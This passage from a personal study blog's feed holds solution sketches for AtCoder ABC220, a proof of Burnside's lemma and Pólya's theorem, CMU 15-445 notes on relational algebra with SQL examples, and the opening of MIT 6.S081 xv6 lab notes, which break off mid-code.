<h2 id="C-Long-Sequence"><a href="#C-Long-Sequence" class="headerlink" title="C. Long Sequence"></a>C. Long Sequence</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_c">传送门</a></li>
<li>给定长度为 $N$ 的序列 $A$，$B$ 是 $A$ 的无限复制版本，即将无数个 $A$ 接在一起。问从 $B$ 的第多少个数开始有前缀和大于给定的 $X$。</li>
<li>$1\leq N\leq 10^5,1\leq X\leq 10^{18},1\leq A_i\leq 10^9$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>计算出一整个 $A$ 的和，然后用 $X$ 除以该和可以定位到溢出点在第几段中，再枚举溢出点即可。总时间复杂度 $O(N)$。</p>
<h2 id="D-FG-Operation"><a href="#D-FG-Operation" class="headerlink" title="D. FG Operation"></a>D. FG Operation</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_d">传送门</a></li>
<li>给定长度为 $N$ 的序列 $A$，有两种操作：删去最左边的两个数，并在左边插入它们的和 mod 10；删去最左边的两个数，并在左边插入它们的积 mod 10。求对于每个 $0\leq k\leq 9$ ，最后剩下的数是 $k$ 的方案数。</li>
<li>$N\leq 10^5,0\leq A_i\leq 9$。</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>考虑动态规划。令 $dp[i][j]$ 表示当前考虑到第 $i$ 位，最左边的数字是 $j$ 的方案数。转移考虑下一次操作是乘还是加即可。总时间复杂度 $O(N)$。</p>
<h2 id="E-Distance-on-Large-Perfect-Binary-Tree"><a href="#E-Distance-on-Large-Perfect-Binary-Tree" class="headerlink" title="E. Distance on Large Perfect Binary Tree"></a>E. Distance on Large Perfect Binary Tree</h2><h3 id="题面描述-4"><a href="#题面描述-4" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_e">传送门</a></li>
<li>给定一个有 $2^n-1$ 个节点的满二叉树，再给定整数 $D$ ，问二叉树上有多少对节点之间的距离为 $D$。</li>
<li>$n\leq 10^6,D\leq 2\times 10^6$。</li>
</ul>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>考虑动态规划。令 $dp[i]$ 表示有 $2^i-1$ 个节点的满二叉树中，lca 为根节点且距离为 $D$ 的节点的对数。计算 $dp[i]$ 只需在 $dp[i-1]$ 的基础上考虑那些至少有一个节点是叶子的点对即可。计算完 dp 后枚举二叉树上的每个节点，计算经过它的点对个数。总时间复杂度 $O(n)$。</p>
<h2 id="F-Distance-Sums-2"><a href="#F-Distance-Sums-2" class="headerlink" title="F. Distance Sums 2"></a>F. Distance Sums 2</h2><h3 id="题面描述-5"><a href="#题面描述-5" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_f">传送门</a></li>
<li>给定一棵 $n$ 个节点的树，标号 $1,2,…,n$ 。对于每个节点 $i$，求 $\sum_{j=1}^nd(i,j)$。</li>
<li>$n\leq 2\times 10^5$。</li>
</ul>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>对于每个节点 $u$，考虑树上的每条边会被所有的最短路径经过多少次。容易发现所有在从 $u$ 到根的路径上的边会被经过 $n-size$ 次，其中 $size$ 指该边下面的子树的大小，而其他边会被经过 $size$ 次。因此我们只要先随便挑选一个节点作为根进行一次搜索，预处理每个子树的 size，再从根做一次搜索，搜索的同时修改从当前节点到根的边上的贡献并统计答案即可。</p>
<p>总时间复杂度 $O(n)$。</p>
<h2 id="G-Isosceles-Trapezium"><a href="#G-Isosceles-Trapezium" class="headerlink" title="G. Isosceles Trapezium"></a>G. Isosceles Trapezium</h2><h3 id="题面描述-6"><a href="#题面描述-6" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_g">传送门</a></li>
<li>给定平面上的 $n$ 个点，每个点有一个权值 $w$ 。现要求挑出其中的 4 个点，使其可以围成一个等腰梯形且四个顶点的权值之和最大。</li>
<li>$n\leq 1000$。</li>
</ul>
<h3 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h3><p>一个等腰梯形会具有以下关键性质：</p>
<ul>
<li>上下两条边的垂直平分线重合</li>
<li>上下两条边的中点不重合</li>
</ul>
<p>因此我们枚举图上的所有线段，维护线段的垂直平分线、中点和权值（两个顶点的权值和）。将垂直平分线相同的线段划成一组，在一组中寻找中点不同且权值最大的两条线段更新答案即可。</p>
<p>此题有一些计算几何上的处理细节。笔者采用了分数类维护线段的斜率，但事实上使用 $Ax+By+C=0$ 的形式更加好。</p>
<h2 id="H-Security-Camera"><a href="#H-Security-Camera" class="headerlink" title="H. Security Camera"></a>H. Security Camera</h2><h3 id="题面描述-7"><a href="#题面描述-7" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://atcoder.jp/contests/abc220/tasks/abc220_h">传送门</a></li>
<li>给定一个 $n$ 个点 $m$ 条边的图，每个点可以选或不选。问在所有的 $2^n$ 中选择点的方案中，有多少种方案可以监控到偶数条边，其中一条边被监控到当且仅当它的至少一个端点被选中。</li>
<li>$n\leq 40$。</li>
</ul>
<h3 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h3><p>对于一个点集能监控多少条边，一个自然的想法是累加所有点的度数，但还要扣除那些被重复计算的边，即两个端点都在点集中的边。</p>
<p>该数据范围容易让人想到折半搜索，我们将前 $\frac{n}{2}$ 个点分为第一组，剩下的分为第二组。令 $dp_1[Mask]$ 表示在第一组中选择了点集 $Mask$ 的情况下，所有点的度数之和（包括连向另外一组的度数）减去被重复计算的边，是奇数还是偶数。利用一些位运算技巧，该 dp 可以在 $O(2^n\cdot n)$ 的时间复杂度内完成。对于 $dp_2[Mask]$ 原理类似。但稍稍修改定义：令 $dp_2[0/1][Mask]$ 表示在第二组中选择 $Mask$，结果是奇数/偶数，有没有可能。</p>
<p>接下来考虑两个组的合并。令 $c[0/1][Mask]$ 表示第一组的点集在第二组中的映射为 $Mask$，且第一组中 dp 结果是奇数/偶数的方案数。其中第一组在第二组中的映射指的是第一组点集中所有点在第二组中的相邻点 Mask 全部异或的结果。这样如果在第二组中选中了 $Mask$ 中的节点，则说明第一组中有奇数个点连向了该点，在扣除两个组之间重复计算的边的时候在此处需要减去一个奇数，即会改变奇偶性。</p>
<p>令<br>$$<br>A[t][0]=\sum_{Mask\&amp; Mask’=t}\left(c[0][Mask]\cdot dp_2[0][Mask’]+c[1][Mask]\cdot dp_2[1][Mask’]\right)<br>$$</p>
<p>$$<br>A[t][1]=\sum_{Mask\&amp; Mask’=t}\left(c[0][Mask]\cdot dp_2[1][Mask’]+c[1][Mask]\cdot dp_2[0][Mask’]\right)<br>$$则最后只需要根据 $t$ 中 1 的个数与第二维的 0/1 来计算偶数的答案。$A$ 数组是与卷积，可以利用 FWT 优化。</p>
<p>总时间复杂度 $O(2^n\cdot n)$。</p>
]]></content>
      <tags>
        <tag>AtCoder</tag>
        <tag>动态规划</tag>
        <tag>计算几何</tag>
        <tag>FWT</tag>
      </tags>
  </entry>
  <entry>
    <title>Burnside引理和Polya定理</title>
    <url>/2021/11/12/Burnside%E5%BC%95%E7%90%86%E5%92%8CPolya%E5%AE%9A%E7%90%86/</url>
    <content><![CDATA[<h2 id="Burnside引理"><a href="#Burnside引理" class="headerlink" title="Burnside引理"></a>Burnside引理</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>设 $A$ 和 $B$ 为有限集，$X$ 是一些从 $A$ 到 $B$ 的映射的集合。$G$ 是 $A$ 上的置换群，且 $X$ 中的映射在 $G$ 的作用下封闭，那么<br>$$<br>|X/G|=\frac{1}{|G|}\sum_{g\in G}|X^g|<br>$$<br>其中 $X/G$ 表示 $X$ 在 $G$ 的作用下所有等价类的集合（对于 $x,y\in X$，若存在 $g\in G$, $g(x)=y$，则 $x,y$ 在同一个等价类中）。$X^g=\{x\in X:g(x)=x\}$。</p>
<span id="more"></span>

<h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p>首先给出<strong>轨道稳定子定理</strong>：$X$ 和 $G$ 的定义同上，对于任意 $x\in X$，称 $G^x=\{g\in G:g(x)=x\}$ 为 $x$ 的<strong>稳定子</strong>，$G(x)=\{g(x):g\in G\}$ 为 $x$ 的<strong>轨道</strong>，则<br>$$<br>|G|=|G^x||G(x)|<br>$$</p>
<blockquote>
<p>证明：首先证明 $G^x$ 是 $G$ 的一个子群：恒等置换 $I$ 满足 $I(x)=x$，所以 $I\in G^x,G^x\neq \emptyset$ 。对于任意 $g\in G^x,h\in G^x$，考虑 $h$ 在 $G$ 中的逆元 $h^{-1}$，因为 $h^{-1}(x)=h^{-1}(h(x))$$=(h^{-1}\circ h)(x)=I(x)=x$，所以 $h^{-1}\in G^x$，于是 $gh^{-1}(x)=g(h^{-1}(x))=g(x)=x$，所以 $gh^{-1}\in G^x$。所以 $G^x$ 是 $G$ 的子群。</p>
<p>根据拉格朗日定理，$|G^x||G:G^x|=|G|$，其中 $G:G^x$ 表示 $G^x$ 的所有左陪集构成的集合。所以现在只要证明 $|G(x)|=|G:G^x|$。考虑映射 $\varphi: G(x)\rightarrow G:G^x$，$\varphi(g(x))=gG^x$，下证 $\varphi$ 是双射：</p>
<ul>
<li>如果 $g(x),f(x)\in G(x)$ 满足 $gG^x=fG^x$，两边左乘 $f^{-1}$ 有 $(f^{-1}g)G^x=G^x$，所以有 $f^{-1}g\in G^x$，$(f^{-1}\circ g)(x)=x$。两边左乘 $f$ 即有 $g(x)=f(x)$，所以 $\varphi$ 是单射。</li>
<li>对于 $G:G^x$ 中的任意一个左陪集 $gG^x$，存在 $g(x)\in G(x)$，$\varphi(g(x))=gG^x$，所以 $\varphi$ 是满射。</li>
</ul>
<p>结合以上两点，$\varphi$ 是双射，从而有 $|G(x)|=|G:G^x|$。</p>
<p>综上，轨道稳定子定理得证。$\blacktriangle$ </p>
</blockquote>
<p>再考虑 Burnside 引理的证明，我们有</p>
<p>$$<br>\begin{align}<br>\sum_{g\in G}|X^g| &amp;= |\{(g,x)\in G\times X: g(x)=x\}|\\<br>&amp;= \sum_{x\in X}|G^x|\\<br>&amp;= \sum_{x\in X}\frac{|G|}{|G(x)|}\quad (轨道稳定子定理)\\<br>&amp;= |G|\sum_{Y\in X/G}\sum_{x\in Y}\frac{1}{|G(x)|}\\<br>&amp;= |G|\sum_{Y\in X/G}\sum_{x\in Y}\frac{1}{|Y|}\quad (*)\\<br>&amp;= |G||X/G|<br>\end{align}<br>$$<br>注： $(*)$ 一步的道理来自映射集合 $X$ 在 $G$ 的作用下的等价类的含义。事实上对于任意 $x\in G$，$x$ 的轨道就是 $x$ 所在的等价类。</p>
<h2 id="Polya定理"><a href="#Polya定理" class="headerlink" title="Polya定理"></a>Polya定理</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>在 Burnside 引理的基本条件的基础上，若 $X$ 是全部从 $A$ 到 $B$ 映射的集合（那么显然有 $X$ 在 $G$ 的作用下封闭），那么<br>$$<br>|X/G|=\frac{1}{|G|}\sum_{g\in G}|B|^{c(g)}<br>$$<br>其中 $c(g)$ 表示置换 $g$ 中的轮换（循环子置换）个数。</p>
<h3 id="证明-1"><a href="#证明-1" class="headerlink" title="证明"></a>证明</h3><p>事实上 Polya 定理是在 Burnside 引理的基础上给出了一种高效计算 $|X^g|$ 的方法。 当 $X$ 是全部从 $A$ 到 $B$ 的映射的集合时，映射 $\phi$ 在 $g$ 的作用下是不动映射的充要条件是对于 $g$ 中的每个轮换，轮换中元素对应的 $\phi$ 值相同。$\phi$ 值有 $|B|$ 种选择，从而根据乘法原理，不动映射的个数是 $|B|^{c(g)}$。</p>
]]></content>
      <tags>
        <tag>数学笔记</tag>
        <tag>群论</tag>
      </tags>
  </entry>
  <entry>
    <title>CMU 15-445 Lecture 01: Relational Model and Relational Algebra</title>
    <url>/2022/01/23/CMU-15445%20Lecture%2001%20-%20Relational%20Model%20and%20Relational%20Algebra/</url>
    <content><![CDATA[<p>Database: collection of data that relates to gather and tries to model some aspect of the world.</p>
<h2 id="Flat-Files"><a href="#Flat-Files" class="headerlink" title="Flat Files"></a>Flat Files</h2><h3 id="Strawman"><a href="#Strawman" class="headerlink" title="Strawman"></a>Strawman</h3><p>we store our database as comma-separated value (CSV) files that we manage in our own code. </p>
<ul>
<li>Use separated files for each entity.</li>
<li>Application has to parse the files each time they want to read/update records.</li>
</ul>
<span id="more"></span>

<p>For example: a music database</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Artist.CSV (name, year, country)</span><br><span class="line">&quot;Wu Tang Clan&quot;, 1992, &quot;USA&quot;</span><br><span class="line">&quot;Ice Cube&quot;, 1989, &quot;USA&quot;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Album.CSV (namme, artist, year)</span><br><span class="line">&quot;Enter the Wu Tang&quot;, &quot;Wu Tang Clan&quot;, 1993</span><br><span class="line">&quot;AmeriKKKa&#x27;s Most Wanted&quot;, &quot;Ice Cube&quot;, 1990</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>If we want to get the year that “Ice Cube” went solo, we can write the python code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Artist.CSV:</span><br><span class="line">	record = parse(line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Ice Cube&quot;</span> == record[<span class="number">0</span>]</span><br><span class="line">    	<span class="built_in">print</span> <span class="built_in">int</span>(record[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h3 id="Drawback-Data-Integrity"><a href="#Drawback-Data-Integrity" class="headerlink" title="Drawback: Data Integrity"></a>Drawback: Data Integrity</h3><ul>
<li><p>How do we ensure that the artist is the same for each album entry? e.g. Ice Cube modifies its name, how do we ensure that we modify all the “Ice Cube” in the database?</p>
</li>
<li><p>What if somebody the album year with an invalid string?</p>
<p>  There’s no protection mechanism in our database now, all the files are regular files that anyone has access to.</p>
</li>
<li><p>How do we store if there are multiple artists on an album?</p>
</li>
<li><p>…</p>
</li>
</ul>
<h3 id="Drawback-Implementation"><a href="#Drawback-Implementation" class="headerlink" title="Drawback: Implementation"></a>Drawback: Implementation</h3><ul>
<li><p>How do you find a particular record? </p>
<p>  Linear searching will be too slow if there are huge amounts of entries in the database.</p>
</li>
<li><p>What if we now want to create a new application that uses the same database?</p>
</li>
<li><p>What if two threads try to write to the same file at the same time?</p>
</li>
<li><p>…</p>
</li>
</ul>
<h3 id="Drawback-Durability"><a href="#Drawback-Durability" class="headerlink" title="Drawback: Durability"></a>Drawback: Durability</h3><ul>
<li>What if the machine crashes while our program is updating a record?</li>
<li>What if we want to replicate the database on multiple machines for high avalability?</li>
<li>…</li>
</ul>
<h2 id="Database-Management-System"><a href="#Database-Management-System" class="headerlink" title="Database Management System"></a>Database Management System</h2><p>A <strong>DBMS</strong> is a specialized software that allows applications to store and analyze information in a database. A general purpose DBMS is designed to allow the definition, creation, querying, update, and administration of database.</p>
<h2 id="Relational-Model"><a href="#Relational-Model" class="headerlink" title="Relational Model"></a>Relational Model</h2><p>Background: in 1960s, people rewrote DBMS every time the physical layer was changed.</p>
<p>3 key points about relational model:</p>
<ul>
<li>store database in simple data structures (relation)</li>
<li>access data through high-level language (e.g. SQL)</li>
<li>physical storage left up to implementation i.e. the specific implementation of storage(disk, memory etc.) is transparent to the applications, which is good for portability.</li>
</ul>
<p>The relational data model defines three concepts:</p>
<ul>
<li>Structure: the definition of relations and their contents</li>
<li>Integrity: ensure that database’s contents satisfy constraints</li>
<li>Manipulation: how to access and modify a database’s contents</li>
</ul>
<h3 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h3><p>A <strong>Relation</strong> is an unordered set that contains the relationship of attributes that represent entities. (In the picture, a table is a relation)</p>
<p>A <strong>tuple</strong> is a set of attribute values (domains) in the relation. (In the picture, a “row” in the table is a tuple with several attribute values (name, year, country etc.) ) Conventionally, attribute values have to be atomic/scalar i.e. arrays, lists… cannot be stored as an attribute value.</p>
<img src="https://kristoff-starling.github.io/files/CMU-15445-01-01.png" width="80%"/>

<p>A <strong>primary key</strong> is an attribute that can uniquely identify a single tuple. For example, “year” is not a primary key since it’s not unique in the table; “Wu Tang Clan” is also not a primary key because it’s allowed that in the future an artist with the same name will be created. The id is the primary key. Some DBMSs automatically create an internal primary key if you don’t define one.</p>
<p>A <strong>foreign key</strong> specifies that an attribute from one relation maps to a tuple in another relation. For example, the <code>album_id</code> attribute 11 in <code>ArtistAlbum</code> table is a foreign key since it maps to “Enter the Wu Tang”.</p>
<p>(Usually) attribute values should be scalar so we cannot store multiple artists into one album. But by adding an additional relation <code>ArtistAlbum</code> shown above, we can achieve that. In addition, the DBMS can check whether the given <code>artist_id</code> and <code>album_id</code> are valid.</p>
<h3 id="Data-Manipulation-Languages-DML"><a href="#Data-Manipulation-Languages-DML" class="headerlink" title="Data Manipulation Languages (DML)"></a>Data Manipulation Languages (DML)</h3><p>DML describes how to store and retrieve data from a database. There are mainly two types:</p>
<ul>
<li><p>Procedural: the query specifies the (high-level) strategy the DBMS should use to find results.</p>
<p>  Relational Algebra</p>
</li>
<li><p>Non-Procedural: the query specifies only what data is wanted and not how to find it.</p>
<p>  Relational Calculus</p>
</li>
</ul>
<h2 id="Relational-Algebra"><a href="#Relational-Algebra" class="headerlink" title="Relational Algebra"></a>Relational Algebra</h2><h3 id="Basic-Operators"><a href="#Basic-Operators" class="headerlink" title="Basic Operators"></a>Basic Operators</h3><h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><ul>
<li><p>Syntax: $\sigma_{predicate}(R)$</p>
</li>
<li><p>Description: choose a subset of the tuples from a relation that satisfies a selection predicate. Here the predicate serves as a filter to retain only tuples that fulfill its qualifying requirement.</p>
</li>
<li><p>Example:</p>
  <img src="https://kristoff-starling.github.io/files/CMU-15445-01-02.png" width="50%" />

<p>  In SQL, it’s written as</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> R</span><br><span class="line">	<span class="keyword">WHERE</span> a_id <span class="operator">=</span> <span class="string">&#x27;a2&#x27;</span> <span class="keyword">AND</span> b_id <span class="operator">&gt;</span> <span class="number">102</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Projection"><a href="#Projection" class="headerlink" title="Projection"></a>Projection</h4><ul>
<li><p>Syntax: $\Pi_{A_1,A_2,\cdots,A_n}(R)$</p>
</li>
<li><p>Description: generate a relation with tuples that contains only the specified attributes. We can rearrange attributes’ ordering and manipulate the values.</p>
</li>
<li><p>Example (We can combine operators to achieve abundant functionality):</p>
  <img src="https://kristoff-starling.github.io/files/CMU-15445-01-03.png" width="50%" />

<p>  In SQL, it’s written as</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> b_id <span class="operator">-</span> <span class="number">100</span>, a_id</span><br><span class="line">	<span class="keyword">FROM</span> R <span class="keyword">WHERE</span> a_id <span class="operator">=</span> <span class="string">&#x27;a2&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h4><ul>
<li><p>Syntax: $(R \cup S)$</p>
</li>
<li><p>Description: the same as set algebra. Notice that $R$ and $S$ should have the exact same attributes.</p>
</li>
<li><p>SQL example:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> R)</span><br><span class="line">	<span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> S);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Intersection"><a href="#Intersection" class="headerlink" title="Intersection"></a>Intersection</h4><ul>
<li><p>Syntax: $(R\cap S)$</p>
</li>
<li><p>Description: the same as set algebra. Notice that $R$ and $S$ should have the exact same attributes.</p>
</li>
<li><p>SQL example:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> R)</span><br><span class="line">	<span class="keyword">INTERSECT</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> S);</span><br></pre></td></tr></table></figure>
<h4 id="Difference"><a href="#Difference" class="headerlink" title="Difference"></a>Difference</h4></li>
<li><p>Syntax: $(R - S)$</p>
</li>
<li><p>Description: the same as set algebra. Notice that $R$ and $S$ should have the exact same attributes.</p>
</li>
<li><p>SQL example:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> R)</span><br><span class="line">	<span class="keyword">EXCEPT</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> S);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h4><ul>
<li><p>Syntax: $(R\times S)$</p>
</li>
<li><p>Description: the same as set algebra (Cartesian product)</p>
</li>
<li><p>SQL example:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> R <span class="keyword">CROSS</span> <span class="keyword">JOIN</span> S;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="Join"><a href="#Join" class="headerlink" title="Join"></a>Join</h4><ul>
<li><p>Syntax: $(R\Join S)$</p>
</li>
<li><p>Description: Join takes in two relations and outputs a relation that contains all the tuples that are a combination of two tuples where for each attribute that the two relations share, the values for that attribute of both tuples is the same.</p>
<p>  The difference between “Join” and “Intersection” is that, Join doesn’t require that the two relations have the exact same attributes, it only requires that their common attributes should be the same.</p>
</li>
<li><p>SQL example:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> R <span class="keyword">NATURAL</span> <span class="keyword">CROSS</span> S;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h3><p>Relational algebra is a kind of procedural language because it defines the high-level steps of how to compute a query. For example:</p>
<blockquote>
<p>We want to get all the tuples in relation R and S whose <code>a_id</code> equals 102.</p>
</blockquote>
<p>$\sigma_{a_id=102}(R\Join S)$ and $R\Join(\sigma_{a_id=102}(S))$ can both achieve the goal, but their efficiency may vary much. Suppose $R$ and $S$ both have $a$ tuples, but there’s only one tuple in $S$ satisfying $a_id=102$. </p>
<ul>
<li>In the first expression, $\Join$ may take $a^2$ complexity, and $\sigma$ finds only one tuple. - $O(a^2)$</li>
<li>In the second expression, $\sigma$ takes $a$ complexity and finds only one valid tuple, and then $\Join$ also only takes $a$ complexity. - $O(a)$</li>
</ul>
<p>If $a$ is huge enough, the second operations is much faster than the first one.</p>
<p>A better approach is to say the result you want, and let the DBMS decide the steps it wants to compute a query according to the data size. SQL will do exactly this, and it is the de facto standard for writing queries.</p>
<p>Compare the SQL query with our strawman’s python query:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Artist.CSV:</span><br><span class="line">	record = parse(line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Ice Cube&quot;</span> == record[<span class="number">0</span>]</span><br><span class="line">    	<span class="built_in">print</span> <span class="built_in">int</span>(record[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">year</span> <span class="keyword">FROM</span> artists</span><br><span class="line">	<span class="keyword">WHERE</span> name <span class="operator">=</span> &quot;Ice Cube&quot;</span><br></pre></td></tr></table></figure>

<p>SQL’s robustness is much stronger. It doesn’t depend on the implementation of database, so if the low-level organization of the database is changed (e.g. using a tree instead of a list to store data), the application layer doesn’t need to change (while the python code becomes completely useless.)</p>
]]></content>
  </entry>
  <entry>
    <title>MIT-6.S081 Lab 01: Xv6 and Unix utilities</title>
    <url>/2022/01/26/MIT-6.S081%20Lab%2001%20-%20Xv6%20and%20Unix%20utilities/</url>
    <content><![CDATA[<h2 id="Progress"><a href="#Progress" class="headerlink" title="Progress"></a>Progress</h2><ul>
<li><input checked="" disabled="" type="checkbox"> boot xv6 (easy)</li>
<li><input checked="" disabled="" type="checkbox"> sleep (easy)</li>
<li><input checked="" disabled="" type="checkbox"> pingpong (easy)</li>
<li><input checked="" disabled="" type="checkbox"> primes (medium)/(hard)</li>
<li><input checked="" disabled="" type="checkbox"> find (medium)</li>
<li><input checked="" disabled="" type="checkbox"> xargs (medium)</li>
</ul>
<span id="more"></span>

<h2 id="Boot-xv6-easy"><a href="#Boot-xv6-easy" class="headerlink" title="Boot xv6 (easy)"></a>Boot xv6 (easy)</h2><p>刚刚克隆完项目后文件夹里没有东西，这是正常的。切换到 util 分支之后即可看到内容。</p>
<p>使用 <code>make grade</code> 命令进行尝试时发现报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/env: python: No such file or directory</span><br></pre></td></tr></table></figure>

<p>笔者根据 stakoverflow 上的<a href="https://stackoverflow.com/questions/3655306/ubuntu-usr-bin-env-python-no-such-file-or-directory">这个回答</a>进行了修复：首先检查了一下 python3 是否安装，发现已经安装。出现上述报错的原因是系统内只有 python3 这个程序。因此只要创建一个名为 python 的指向 python3 的软链接即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python</span><br></pre></td></tr></table></figure>

<p>想要使用 gdb 调试 xv6 的话，可以先在一个窗口工作目录下执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make CPUS=1 qemu-gdb</span><br></pre></td></tr></table></figure>

<p>然后新开一个窗口，在工作目录下执行 <code>riscv64-linux-gnu-gdb</code> 或 <code>gdb-multiarch</code>，后者会自行判断架构。初次运行可能会遇到 .gdbinit 相关的问题。此时需要创建文件 <code>~/.gdbinit</code>，并在其中写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">add-auto-load-safe-path ~/xv6-labs-2020/.gdbinit</span><br></pre></td></tr></table></figure>

<h2 id="sleep-easy"><a href="#sleep-easy" class="headerlink" title="sleep (easy)"></a>sleep (easy)</h2><p>C 语言编程练习，只需要使用 <code>sleep()</code> 系统调用即可。不过需要注意 sleep 的参数规则：</p>
<ul>
<li>如果 sleep 没有参数，应当给出错误提示。</li>
<li>sleep 可以有多个参数，应该将多个参数相加的值传给 <code>sleep()</code> 系统调用。</li>
<li>sleep 的任何一个参数中有非数字字符时，应当给出错误提示。</li>
</ul>
<h2 id="pingpong-easy"><a href="#pingpong-easy" class="headerlink" title="pingpong (easy)"></a>pingpong (easy)</h2><p>笔者最初只是用了一个管道，在父进程中 <code>write(p[1], &quot;a&quot;, 1)</code> 后又 <code>read(p[0], buf, sizeof(buf))</code>，但这样相当于父进程从管道里读到了自己的输出，没有完成和子进程的互动。</p>
<p>因此需要使用两个管道，第一个管道用于父进程输出，子进程读入，第二个管道用于子进程输出，父进程读入。</p>
<h2 id="primes-moderate-hard"><a href="#primes-moderate-hard" class="headerlink" title="primes (moderate)/(hard)"></a>primes (moderate)/(hard)</h2><p>笔者的初代实现如下：</p>
<blockquote>
<p> 以第一层为例，父进程创建一个管道之后 fork 出一个子进程，然后将 $2,3,\cdots,35$ 喂给管道的输出端。子进程从管道的输入端接收这些数。子进程收到的第一个数一定是质数，它可以用这个数将剩下的数中这个质数的倍数筛除。之后子进程自己变成一个“父进程”，将收到的数中除了最小质数和被筛除的数的其他数传给自己的子进程。该过程一直持续，直到没有数为止。</p>
<p> 核心代码：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (tot &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"> pipe(p);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> pid = fork();</span><br><span class="line"> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) exit_error();</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     close(p[<span class="number">1</span>]);</span><br><span class="line">     <span class="keyword">int</span> cur, curp; tot = <span class="number">-1</span>;</span><br><span class="line">     <span class="keyword">while</span> (read(p[<span class="number">0</span>], &amp;cur, <span class="keyword">sizeof</span>(cur)) &gt; <span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span> (tot == <span class="number">-1</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, cur);</span><br><span class="line">             tot ++; curp = cur;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span> (cur % curp != <span class="number">0</span>) a[tot ++] = cur;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     close(p[<span 